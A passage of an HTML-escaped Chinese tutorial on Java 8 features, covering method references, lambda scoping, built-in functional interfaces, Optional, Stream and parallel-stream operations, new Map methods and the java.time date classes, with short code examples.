&lt;p&gt;然后，我们再定义一个工厂接口，用来生成 &lt;code&gt;Person&lt;/code&gt; 类：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// Person 工厂
interface PersonFactory&amp;lt;P extends Person&amp;gt; {
    P create(String firstName, String lastName);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们可以通过 &lt;code&gt;::&lt;/code&gt; 关键字来引用 &lt;code&gt;Person&lt;/code&gt; 类的构造器，来代替手动去实现这个工厂接口：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 直接引用 Person 构造器
PersonFactory&amp;lt;Person&amp;gt; personFactory = Person::new;
Person person = personFactory.create(&quot;Peter&quot;, &quot;Parker&quot;);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Person::new&lt;/code&gt; 这段代码，能够直接引用 &lt;code&gt;Person&lt;/code&gt; 类的构造器。然后 Java 编译器能够根据上下文选中正确的构造器去实现 &lt;code&gt;PersonFactory.create&lt;/code&gt; 方法。&lt;/p&gt;
&lt;h2 id=&quot;lambda-访问外部变量及接口默认方法&quot;&gt;Lambda 访问外部变量及接口默认方法&lt;/h2&gt;
&lt;p&gt;在本章节中，我们将会讨论如何在 lambda 表达式中访问外部变量（包括：局部变量，成员变量，静态变量，接口的默认方法.），它与匿名内部类访问外部变量很相似。&lt;/p&gt;
&lt;h3 id=&quot;访问局部变量&quot;&gt;访问局部变量&lt;/h3&gt;
&lt;p&gt;在 Lambda 表达式中，我们可以访问外部的 &lt;code&gt;final&lt;/code&gt; 类型变量，如下面的示例代码：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 转换器
@FunctionalInterface
interface Converter&amp;lt;F, T&amp;gt; {
    T convert(F from);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;final int num = 1;
Converter&amp;lt;Integer, String&amp;gt; stringConverter =
        (from) -&amp;gt; String.valueOf(from + num);

stringConverter.convert(2);     // 3&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;与匿名内部类不同的是，我们不必显式声明 &lt;code&gt;num&lt;/code&gt; 变量为 &lt;code&gt;final&lt;/code&gt; 类型，下面这段代码同样有效：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;int num = 1;
Converter&amp;lt;Integer, String&amp;gt; stringConverter =
        (from) -&amp;gt; String.valueOf(from + num);

stringConverter.convert(2);     // 3&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;但是 &lt;code&gt;num&lt;/code&gt; 变量必须为隐式的 &lt;code&gt;final&lt;/code&gt; 类型，何为隐式的 &lt;code&gt;final&lt;/code&gt; 呢？就是说到编译期为止，&lt;code&gt;num&lt;/code&gt; 对象是不能被改变的，如下面这段代码，就不能被编译通过：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;int num = 1;
Converter&amp;lt;Integer, String&amp;gt; stringConverter =
        (from) -&amp;gt; String.valueOf(from + num);
num = 3;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在 lambda 表达式内部改变 &lt;code&gt;num&lt;/code&gt; 值同样编译不通过，需要注意, 比如下面的示例代码：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;int num = 1;
Converter&amp;lt;Integer, String&amp;gt; converter = (from) -&amp;gt; {
    String value = String.valueOf(from + num);
    num = 3;
    return value;
};&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;访问成员变量和静态变量&quot;&gt;访问成员变量和静态变量&lt;/h3&gt;
&lt;p&gt;上一章节中，了解了如何在 Lambda 表达式中访问局部变量。与局部变量相比，在 Lambda 表达式中对成员变量和静态变量拥有读写权限：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;    @FunctionalInterface
    interface Converter&amp;lt;F, T&amp;gt; {
        T convert(F from);
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class Lambda4 {
        // 静态变量
        static int outerStaticNum;
        // 成员变量
        int outerNum;

        void testScopes() {
            Converter&amp;lt;Integer, String&amp;gt; stringConverter1 = (from) -&amp;gt; {
                // 对成员变量赋值
                outerNum = 23;
                return String.valueOf(from);
            };

            Converter&amp;lt;Integer, String&amp;gt; stringConverter2 = (from) -&amp;gt; {
                // 对静态变量赋值
                outerStaticNum = 72;
                return String.valueOf(from);
            };
        }
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;访问接口的默认方法&quot;&gt;访问接口的默认方法&lt;/h3&gt;
&lt;p&gt;还记得第一章节中定义的那个 &lt;code&gt;Formula&lt;/code&gt; (公式) 接口吗？&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@FunctionalInterface
interface Formula {
    // 计算
    double calculate(int a);

    // 求平方根
    default double sqrt(int a) {
        return Math.sqrt(a);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当时，我们在接口中定义了一个带有默认实现的 &lt;code&gt;sqrt&lt;/code&gt; 求平方根方法，在匿名内部类中我们可以很方便的访问此方法：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Formula formula = new Formula() {
    @Override
    public double calculate(int a) {
        return sqrt(a * 100);
    }
};&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;但是在 lambda 表达式中可不行：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Formula formula = (a) -&amp;gt; sqrt(a * 100);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;带有默认实现的接口方法，是&lt;strong&gt;不能&lt;/strong&gt;在 lambda 表达式中访问的，上面这段代码将无法被编译通过。&lt;/p&gt;
&lt;h2 id=&quot;内置的函数式接口&quot;&gt;内置的函数式接口&lt;/h2&gt;
&lt;p&gt;JDK 1.8 API 包含了很多内置的函数式接口。其中就包括我们在老版本中经常见到的 Comparator 和 Runnable，Java 8 为他们都添加了 @FunctionalInterface 注解，以用来支持 Lambda 表达式。&lt;/p&gt;
&lt;p&gt;值得一提的是，除了 Comparator 和 Runnable 外，还有一些新的函数式接口，它们很多都借鉴于知名的 &lt;a href=&quot;https://github.com/google/guava&quot;&gt;Google Guava&lt;/a&gt; 库。&lt;/p&gt;
&lt;p&gt;对于它们，即使你已经非常熟悉了，还是最好了解一下的：&lt;/p&gt;
&lt;h3 id=&quot;predicate-断言&quot;&gt;Predicate 断言&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Predicate&lt;/code&gt; 是一个可以指定入参类型，并返回 boolean 值的函数式接口。它内部提供了一些带有默认实现的方法，可以&lt;br/&gt;被用来组合一个复杂的逻辑判断（&lt;code&gt;and&lt;/code&gt;, &lt;code&gt;or&lt;/code&gt;, &lt;code&gt;negate&lt;/code&gt;）：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Predicate&amp;lt;String&amp;gt; predicate = (s) -&amp;gt; s.length() &amp;gt; 0;

predicate.test(&quot;foo&quot;);              // true
predicate.negate().test(&quot;foo&quot;);     // false

Predicate&amp;lt;Boolean&amp;gt; nonNull = Objects::nonNull;
Predicate&amp;lt;Boolean&amp;gt; isNull = Objects::isNull;

Predicate&amp;lt;String&amp;gt; isEmpty = String::isEmpty;
Predicate&amp;lt;String&amp;gt; isNotEmpty = isEmpty.negate();&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;function&quot;&gt;Function&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Function&lt;/code&gt; 函数式接口的作用是，我们可以为其提供一个原料，他给生产一个最终的产品。通过它提供的默认方法，组合,链行处理(&lt;code&gt;compose&lt;/code&gt;, &lt;code&gt;andThen&lt;/code&gt;)：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Function&amp;lt;String, Integer&amp;gt; toInteger = Integer::valueOf;
Function&amp;lt;String, String&amp;gt; backToString = toInteger.andThen(String::valueOf);

backToString.apply(&quot;123&quot;);     // &quot;123&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;supplier-生产者&quot;&gt;Supplier 生产者&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Supplier&lt;/code&gt; 与 &lt;code&gt;Function&lt;/code&gt; 不同，它不接受入参，直接为我们生产一个指定的结果，有点像生产者模式：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class Person {
    String firstName;
    String lastName;

    Person() {}

    Person(String firstName, String lastName) {
        this.firstName = firstName;
        this.lastName = lastName;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Supplier&amp;lt;Person&amp;gt; personSupplier = Person::new;
personSupplier.get();   // new Person&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;consumer-消费者&quot;&gt;Consumer 消费者&lt;/h3&gt;
&lt;p&gt;对于 &lt;code&gt;Consumer&lt;/code&gt;，我们需要提供入参，用来被消费，如下面这段示例代码：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class Person {
    String firstName;
    String lastName;

    Person() {}

    Person(String firstName, String lastName) {
        this.firstName = firstName;
        this.lastName = lastName;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Consumer&amp;lt;Person&amp;gt; greeter = (p) -&amp;gt; System.out.println(&quot;Hello, &quot; + p.firstName);
greeter.accept(new Person(&quot;Luke&quot;, &quot;Skywalker&quot;));&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;comparator&quot;&gt;Comparator&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Comparator&lt;/code&gt; 在 Java 8 之前是使用比较普遍的。Java 8 中除了将其升级成了函数式接口，还为它拓展了一些默认方法：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Comparator&amp;lt;Person&amp;gt; comparator = (p1, p2) -&amp;gt; p1.firstName.compareTo(p2.firstName);

Person p1 = new Person(&quot;John&quot;, &quot;Doe&quot;);
Person p2 = new Person(&quot;Alice&quot;, &quot;Wonderland&quot;);

comparator.compare(p1, p2);             // &amp;gt; 0
comparator.reversed().compare(p1, p2);  // &amp;lt; 0&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;optional&quot;&gt;Optional&lt;/h2&gt;
&lt;p&gt;首先，&lt;code&gt;Optional&lt;/code&gt; 它不是一个函数式接口，设计它的目的是为了防止空指针异常（&lt;code&gt;NullPointerException&lt;/code&gt;），要知道在 Java 编程中，&lt;br/&gt;空指针异常可是臭名昭著的。&lt;/p&gt;
&lt;p&gt;让我们来快速了解一下 &lt;code&gt;Optional&lt;/code&gt; 要如何使用！你可以将 &lt;code&gt;Optional&lt;/code&gt; 看做是包装对象（可能是 &lt;code&gt;null&lt;/code&gt;, 也有可能非 &lt;code&gt;null&lt;/code&gt;）的容器。当你定义了&lt;br/&gt;一个方法，这个方法返回的对象可能是空，也有可能非空的时候，你就可以考虑用 &lt;code&gt;Optional&lt;/code&gt; 来包装它，这也是在 Java 8 被推荐使用的做法。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Optional&amp;lt;String&amp;gt; optional = Optional.of(&quot;bam&quot;);

optional.isPresent();           // true
optional.get();                 // &quot;bam&quot;
optional.orElse(&quot;fallback&quot;);    // &quot;bam&quot;

optional.ifPresent((s) -&amp;gt; System.out.println(s.charAt(0)));     // &quot;b&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;stream-流&quot;&gt;Stream 流&lt;/h2&gt;
&lt;p&gt;这一章节，我们开始步入学习 &lt;code&gt;Stream&lt;/code&gt; 流。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;什么是 &lt;code&gt;Stream&lt;/code&gt; 流？&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;简单来说，我们可以使用 &lt;code&gt;java.util.Stream&lt;/code&gt; 对一个包含一个或多个元素的集合做各种操作。这些操作可能是 &lt;em&gt;中间操作&lt;/em&gt; 亦或是 &lt;em&gt;终端操作&lt;/em&gt;。&lt;br/&gt;终端操作会返回一个结果，而中间操作会返回一个 &lt;code&gt;Stream&lt;/code&gt; 流。&lt;/p&gt;
&lt;p&gt;需要注意的是，你只能对实现了 &lt;code&gt;java.util.Collection&lt;/code&gt; 接口的类做流的操作。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;&lt;code&gt;Map&lt;/code&gt; 不支持 &lt;code&gt;Stream&lt;/code&gt; 流。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;Stream&lt;/code&gt; 流支持同步执行，也支持并发执行。&lt;/p&gt;
&lt;p&gt;让我们开始步入学习的旅程吧！Go !&lt;/p&gt;
&lt;h3 id=&quot;filter-过滤&quot;&gt;Filter 过滤&lt;/h3&gt;
&lt;p&gt;首先，我们创建一个 &lt;code&gt;List&lt;/code&gt; 集合：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;List&amp;lt;String&amp;gt; stringCollection = new ArrayList&amp;lt;&amp;gt;();
stringCollection.add(&quot;ddd2&quot;);
stringCollection.add(&quot;aaa2&quot;);
stringCollection.add(&quot;bbb1&quot;);
stringCollection.add(&quot;aaa1&quot;);
stringCollection.add(&quot;bbb3&quot;);
stringCollection.add(&quot;ccc&quot;);
stringCollection.add(&quot;bbb2&quot;);
stringCollection.add(&quot;ddd1&quot;);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Filter&lt;/code&gt; 的入参是一个 &lt;code&gt;Predicate&lt;/code&gt;, 上面已经说到，&lt;code&gt;Predicate&lt;/code&gt; 是一个断言的中间操作，它能够帮我们筛选出我们需要的集合元素。它的返参同样&lt;br/&gt;是一个 &lt;code&gt;Stream&lt;/code&gt; 流，我们可以通过 &lt;code&gt;foreach&lt;/code&gt; 终端操作，来打印被筛选的元素：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;stringCollection
    .stream()
    .filter((s) -&amp;gt; s.startsWith(&quot;a&quot;))
    .forEach(System.out::println);

// &quot;aaa2&quot;, &quot;aaa1&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;注意：&lt;code&gt;foreach&lt;/code&gt; 是一个终端操作，它的返参是 &lt;code&gt;void&lt;/code&gt;, 我们无法对其再次进行流操作。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;sorted-排序&quot;&gt;Sorted 排序&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Sorted&lt;/code&gt; 同样是一个中间操作，它的返参是一个 &lt;code&gt;Stream&lt;/code&gt; 流。另外，我们可以传入一个 &lt;code&gt;Comparator&lt;/code&gt; 用来自定义排序，如果不传，则使用默认的排序规则。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;stringCollection
    .stream()
    .sorted()
    .filter((s) -&amp;gt; s.startsWith(&quot;a&quot;))
    .forEach(System.out::println);

// &quot;aaa1&quot;, &quot;aaa2&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;需要注意，&lt;code&gt;sorted&lt;/code&gt; 不会对 &lt;code&gt;stringCollection&lt;/code&gt; 做出任何改变，&lt;code&gt;stringCollection&lt;/code&gt; 还是原有的那些个元素，且顺序不变：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;System.out.println(stringCollection);
// ddd2, aaa2, bbb1, aaa1, bbb3, ccc, bbb2, ddd1&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;map-转换&quot;&gt;Map 转换&lt;/h3&gt;
&lt;p&gt;中间操作 &lt;code&gt;Map&lt;/code&gt; 能够帮助我们将 &lt;code&gt;List&lt;/code&gt; 中的每一个元素做功能处理。例如下面的示例，通过 &lt;code&gt;map&lt;/code&gt; 我们将每一个 &lt;code&gt;string&lt;/code&gt; 转成大写：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;stringCollection
    .stream()
    .map(String::toUpperCase)
    .sorted((a, b) -&amp;gt; b.compareTo(a))
    .forEach(System.out::println);

// &quot;DDD2&quot;, &quot;DDD1&quot;, &quot;CCC&quot;, &quot;BBB3&quot;, &quot;BBB2&quot;, &quot;AAA2&quot;, &quot;AAA1&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;另外，我们还可以做对象之间的转换，业务中比较常用的是将 &lt;code&gt;DO&lt;/code&gt;（数据库对象） 转换成 &lt;code&gt;BO&lt;/code&gt;（业务对象） 。&lt;/p&gt;
&lt;h3 id=&quot;match-匹配&quot;&gt;Match 匹配&lt;/h3&gt;
&lt;p&gt;顾名思义，&lt;code&gt;match&lt;/code&gt; 用来做匹配操作，它的返回值是一个 &lt;code&gt;boolean&lt;/code&gt; 类型。通过 &lt;code&gt;match&lt;/code&gt;, 我们可以方便的验证一个 &lt;code&gt;list&lt;/code&gt; 中是否存在某个类型的元素。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 验证 list 中 string 是否有以 a 开头的, 匹配到第一个，即返回 true
boolean anyStartsWithA =
    stringCollection
        .stream()
        .anyMatch((s) -&amp;gt; s.startsWith(&quot;a&quot;));

System.out.println(anyStartsWithA);      // true

// 验证 list 中 string 是否都是以 a 开头的
boolean allStartsWithA =
    stringCollection
        .stream()
        .allMatch((s) -&amp;gt; s.startsWith(&quot;a&quot;));

System.out.println(allStartsWithA);      // false

// 验证 list 中 string 是否都不是以 z 开头的,
boolean noneStartsWithZ =
    stringCollection
        .stream()
        .noneMatch((s) -&amp;gt; s.startsWith(&quot;z&quot;));

System.out.println(noneStartsWithZ);      // true&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;count-计数&quot;&gt;Count 计数&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;count&lt;/code&gt; 是一个终端操作，它能够统计 &lt;code&gt;stream&lt;/code&gt; 流中的元素总数，返回值是 &lt;code&gt;long&lt;/code&gt; 类型。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 先对 list 中字符串开头为 b 进行过滤，让后统计数量
long startsWithB =
    stringCollection
        .stream()
        .filter((s) -&amp;gt; s.startsWith(&quot;b&quot;))
        .count();

System.out.println(startsWithB);    // 3&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;reduce&quot;&gt;Reduce&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Reduce&lt;/code&gt; 中文翻译为：&lt;em&gt;减少、缩小&lt;/em&gt;。通过入参的 &lt;code&gt;Function&lt;/code&gt;，我们能够将 &lt;code&gt;list&lt;/code&gt; 归约成一个值。它的返回类型是 &lt;code&gt;Optional&lt;/code&gt; 类型。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Optional&amp;lt;String&amp;gt; reduced =
    stringCollection
        .stream()
        .sorted()
        .reduce((s1, s2) -&amp;gt; s1 + &quot;#&quot; + s2);

reduced.ifPresent(System.out::println);
// &quot;aaa1#aaa2#bbb1#bbb2#bbb3#ccc#ddd1#ddd2&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;parallel-streams-并行流&quot;&gt;Parallel-Streams 并行流&lt;/h2&gt;
&lt;p&gt;前面章节我们说过，&lt;code&gt;stream&lt;/code&gt; 流是支持&lt;strong&gt;顺序&lt;/strong&gt;和&lt;strong&gt;并行&lt;/strong&gt;的。顺序流操作是单线程操作，而并行流是通过多线程来处理的，能够充分利用物理机&lt;br/&gt;多核 CPU 的优势，同时处理速度更快。&lt;/p&gt;
&lt;p&gt;首先，我们创建一个包含 1000000 UUID list 集合。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;int max = 1000000;
List&amp;lt;String&amp;gt; values = new ArrayList&amp;lt;&amp;gt;(max);
for (int i = 0; i &amp;lt; max; i++) {
    UUID uuid = UUID.randomUUID();
    values.add(uuid.toString());
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;分别通过顺序流和并行流，对这个 list 进行排序，测算耗时:&lt;/p&gt;
&lt;h3 id=&quot;顺序流排序&quot;&gt;顺序流排序&lt;/h3&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 纳秒
long t0 = System.nanoTime();

long count = values.stream().sorted().count();
System.out.println(count);

long t1 = System.nanoTime();

// 纳秒转微秒
long millis = TimeUnit.NANOSECONDS.toMillis(t1 - t0);
System.out.println(String.format(&quot;顺序流排序耗时: %d ms&quot;, millis));

// 顺序流排序耗时: 899 ms
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;并行流排序&quot;&gt;并行流排序&lt;/h3&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 纳秒
long t0 = System.nanoTime();

long count = values.parallelStream().sorted().count();
System.out.println(count);

long t1 = System.nanoTime();

// 纳秒转微秒
long millis = TimeUnit.NANOSECONDS.toMillis(t1 - t0);
System.out.println(String.format(&quot;并行流排序耗时: %d ms&quot;, millis));

// 并行流排序耗时: 472 ms&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;正如你所见，同样的逻辑处理，通过并行流，我们的性能提升了近 &lt;strong&gt;50%&lt;/strong&gt;。完成这一切，我们需要做的仅仅是将 &lt;code&gt;stream&lt;/code&gt; 改成了 &lt;code&gt;parallelStream&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&quot;map-集合&quot;&gt;Map 集合&lt;/h2&gt;
&lt;p&gt;前面已经提到过 &lt;code&gt;Map&lt;/code&gt; 是不支持 &lt;code&gt;Stream&lt;/code&gt; 流的，因为 &lt;code&gt;Map&lt;/code&gt; 接口并没有像 &lt;code&gt;Collection&lt;/code&gt; 接口那样，定义了 &lt;code&gt;stream()&lt;/code&gt; 方法。但是，我们可以对其 &lt;code&gt;key&lt;/code&gt;, &lt;code&gt;values&lt;/code&gt;, &lt;code&gt;entry&lt;/code&gt; 使用&lt;br/&gt;流操作，如 &lt;code&gt;map.keySet().stream()&lt;/code&gt;, &lt;code&gt;map.values().stream()&lt;/code&gt; 和 &lt;code&gt;map.entrySet().stream()&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;另外, JDK 8 中对 &lt;code&gt;map&lt;/code&gt; 提供了一些其他新特性:&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Map&amp;lt;Integer, String&amp;gt; map = new HashMap&amp;lt;&amp;gt;();

for (int i = 0; i &amp;lt; 10; i++) {
    // 与老版不同的是，putIfAbent() 方法在 put 之前，
    // 会判断 key 是否已经存在，存在则直接返回 value, 否则 put, 再返回 value
    map.putIfAbsent(i, &quot;val&quot; + i);
}

// forEach 可以很方便地对 map 进行遍历操作
map.forEach((key, value) -&amp;gt; System.out.println(value));&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;除了上面的 &lt;code&gt;putIfAbsent()&lt;/code&gt; 和 &lt;code&gt;forEach()&lt;/code&gt; 外，我们还可以很方便地对某个 &lt;code&gt;key&lt;/code&gt; 的值做相关操作：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// computeIfPresent(), 当 key 存在时，才会做相关处理
// 如下：对 key 为 3 的值，内部会先判断值是否存在，存在，则做 value + key 的拼接操作
map.computeIfPresent(3, (num, val) -&amp;gt; val + num);
map.get(3);             // val33

// 先判断 key 为 9 的元素是否存在，存在，则做删除操作
map.computeIfPresent(9, (num, val) -&amp;gt; null);
map.containsKey(9);     // false

// computeIfAbsent(), 当 key 不存在时，才会做相关处理
// 如下：先判断 key 为 23 的元素是否存在，不存在，则添加
map.computeIfAbsent(23, num -&amp;gt; &quot;val&quot; + num);
map.containsKey(23);    // true

// 先判断 key 为 3 的元素是否存在，存在，则不做任何处理
map.computeIfAbsent(3, num -&amp;gt; &quot;bam&quot;);
map.get(3);             // val33&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;关于删除操作，JDK 8 中提供了能够新的 &lt;code&gt;remove()&lt;/code&gt; API:&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;map.remove(3, &quot;val3&quot;);
map.get(3);             // val33

map.remove(3, &quot;val33&quot;);
map.get(3);             // null&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如上代码，只有当给定的 &lt;code&gt;key&lt;/code&gt; 和 &lt;code&gt;value&lt;/code&gt; 完全匹配时，才会执行删除操作。&lt;/p&gt;
&lt;p&gt;关于添加方法，JDK 8 中提供了带有默认值的 &lt;code&gt;getOrDefault()&lt;/code&gt; 方法：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 若 key 42 不存在，则返回 not found
map.getOrDefault(42, &quot;not found&quot;);  // not found&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对于 &lt;code&gt;value&lt;/code&gt; 的合并操作也变得更加简单：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// merge 方法，会先判断进行合并的 key 是否存在，不存在，则会添加元素
map.merge(9, &quot;val9&quot;, (value, newValue) -&amp;gt; value.concat(newValue));
map.get(9);             // val9

// 若 key 的元素存在，则对 value 执行拼接操作
map.merge(9, &quot;concat&quot;, (value, newValue) -&amp;gt; value.concat(newValue));
map.get(9);             // val9concat&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;新的日期-api&quot;&gt;新的日期 API&lt;/h2&gt;
&lt;p&gt;Java 8 中在包 &lt;code&gt;java.time&lt;/code&gt; 下添加了新的日期 API. 它和 &lt;a href=&quot;http://www.joda.org/joda-time/&quot;&gt;Joda-Time&lt;/a&gt; 库相似，但又不完全相同。接下来，我会通过一些示例代码介绍一下新 API 中&lt;br/&gt;最关键的特性：&lt;/p&gt;
&lt;h3 id=&quot;clock&quot;&gt;Clock&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Clock&lt;/code&gt; 提供对当前日期和时间的访问。我们可以利用它来替代 &lt;code&gt;System.currentTimeMillis()&lt;/code&gt; 方法。另外，通过 &lt;code&gt;clock.instant()&lt;/code&gt; 能够获取一个 &lt;code&gt;instant&lt;/code&gt; 实例，&lt;br/&gt;此实例能够方便地转换成老版本中的 &lt;code&gt;java.util.Date&lt;/code&gt; 对象。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Clock clock = Clock.systemDefaultZone();
long millis = clock.millis();

Instant instant = clock.instant();
Date legacyDate = Date.from(instant);   // 老版本 java.util.Date&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;timezones-时区&quot;&gt;Timezones 时区&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ZoneId&lt;/code&gt; 代表时区类。通过静态工厂方法方便地获取它，入参我们可以传入某个时区编码。另外，时区类还定义了一个偏移量，用来在当前时刻或某时间&lt;br/&gt;与目标时区时间之间进行转换。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;System.out.println(ZoneId.getAvailableZoneIds());
// prints all available timezone ids

ZoneId zone1 = ZoneId.of(&quot;Europe/Berlin&quot;);
ZoneId zone2 = ZoneId.of(&quot;Brazil/East&quot;);
System.out.println(zone1.getRules());
System.out.println(zone2.getRules());

// ZoneRules[currentStandardOffset=+01:00]
// ZoneRules[currentStandardOffset=-03:00]&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;localtime&quot;&gt;LocalTime&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;LocalTime&lt;/code&gt; 表示一个没有指定时区的时间类，例如，&lt;code&gt;10 p.m&lt;/code&gt;.或者 &lt;code&gt;17：30:15&lt;/code&gt;，下面示例代码中，将会使用上面创建的&lt;br/&gt;时区对象创建两个 &lt;code&gt;LocalTime&lt;/code&gt;。然后我们会比较两个时间，并计算它们之间的小时和分钟的不同。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;LocalTime now1 = LocalTime.now(zone1);
LocalTime now2 = LocalTime.now(zone2);

System.out.println(now1.isBefore(now2));  // false

long hoursBetween = ChronoUnit.HOURS.between(now1, now2);
long minutesBetween = ChronoUnit.MINUTES.between(now1, now2);

System.out.println(hoursBetween);       // -3
System.out.println(minutesBetween);     // -239&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;LocalTime&lt;/code&gt; 提供多个静态工厂方法，目的是为了简化对时间对象实例的创建和操作，包括对时间字符串进行解析的操作等。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;LocalTime late = LocalTime.of(23, 59, 59);
System.out.println(late);       // 23:59:59

DateTimeFormatter germanFormatter =
    DateTimeFormatter
        .ofLocalizedTime(FormatStyle.SHORT)
        .withLocale(Locale.GERMAN);

LocalTime leetTime = LocalTime.parse(&quot;13:37&quot;, germanFormatter);
System.out.println(leetTime);   // 13:37&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;localdate&quot;&gt;LocalDate&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;LocalDate&lt;/code&gt; 是一个日期对象，例如：&lt;code&gt;2014-03-11&lt;/code&gt;。它和 &lt;code&gt;LocalTime&lt;/code&gt; 一样是个 &lt;code&gt;final&lt;/code&gt; 类型对象。下面的例子演示了如何通过加减日，月，年等来计算一个新的日期。&lt;/p&gt;
